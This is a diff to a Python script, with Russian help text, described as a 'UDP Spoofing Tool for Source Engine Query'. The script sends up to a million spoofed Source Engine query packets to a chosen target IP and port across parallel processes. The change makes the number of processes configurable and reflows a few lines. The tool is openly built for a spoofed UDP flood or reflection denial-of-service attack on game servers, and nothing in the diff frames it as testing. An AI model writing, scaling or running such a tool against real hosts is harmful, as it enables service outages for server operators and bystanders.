@@ -11,12 +11,20 @@ import argparse
 import multiprocessing
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="UDP Spoofing Tool for Source Engine Query (Multiprocessing version)")
+    parser = argparse.ArgumentParser(
+        description="UDP Spoofing Tool for Source Engine Query (Multiprocessing version). "
+                    "Вы можете задать количество процессов через --processes."
+    )
     parser.add_argument("target_ip", help="IP-адрес цели")
     parser.add_argument("target_port", type=int, help="Порт цели")
-    parser.add_argument("-c", "--count", type=int, default=1000000, help="Общее количество пакетов (по умолчанию 1 млн)")
-    parser.add_argument("--log-every", type=int, default=10000, help="Логировать каждый N-ный пакет (вывод только для процесса 0)")
-    parser.add_argument("--debug-packets", type=int, default=5, help="Сохранить первые N пакетов для диагностики (только процесс 0)")
+    parser.add_argument("-c", "--count", type=int, default=1000000,
+                        help="Общее количество пакетов (по умолчанию 1 млн)")
+    parser.add_argument("--log-every", type=int, default=10000,
+                        help="Логировать каждый N-ный пакет (вывод только для процесса 0)")
+    parser.add_argument("--debug-packets", type=int, default=5,
+                        help="Сохранить первые N пакетов для диагностики (только процесс 0)")
+    parser.add_argument("--processes", type=int, default=8,
+                        help="Количество процессов для отправки пакетов (по умолчанию 8)")
     return parser.parse_args()
 
 QUERY_PACKET = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
@@ -105,7 +113,7 @@ def send_packets_process(tid, target_ip, target_port, packet_count, log_every, d
 
 if __name__ == "__main__":
     args = parse_args()
-    num_processes = 8
+    num_processes = args.processes
     total_packets = args.count
     packets_per_process = total_packets // num_processes
     # Если остаток есть, добавляем его первому процессу
@@ -119,7 +127,8 @@ if __name__ == "__main__":
     for tid in range(num_processes):
         p = multiprocessing.Process(
             target=send_packets_process,
-            args=(tid, args.target_ip, args.target_port, packets_counts[tid], args.log_every, args.debug_packets, result_queue)
+            args=(tid, args.target_ip, args.target_port, packets_counts[tid],
+                  args.log_every, args.debug_packets, result_queue)
         )
         processes.append(p)
         p.start()
